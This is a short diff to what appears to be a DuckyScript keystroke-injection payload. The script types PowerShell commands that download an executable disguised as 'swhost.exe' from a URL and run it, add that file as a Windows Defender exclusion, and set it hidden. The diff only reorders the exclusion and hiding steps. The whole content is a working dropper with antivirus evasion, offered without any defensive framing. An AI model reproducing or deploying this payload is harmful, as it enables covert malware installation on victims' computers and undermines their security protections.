@@ -23,10 +23,10 @@ ENTER
 STRING Invoke-WebRequest -Uri $url -OutFile $output ; if($?) { Start-Process ".\swhost.exe" }
 ENTER
 DELAY 500
-STRING if($?) {Set-ItemProperty -LiteralPath $output -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }
+STRING if($?) {Add-MpPreference -ExclusionProcess $output}
 ENTER
 DELAY 50
-STRING if($?) {Add-MpPreference -ExclusionProcess $output}
+STRING if($?) {Set-ItemProperty -LiteralPath $output -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }
 ENTER
 DELAY 500
 STRING if($?) {exit}
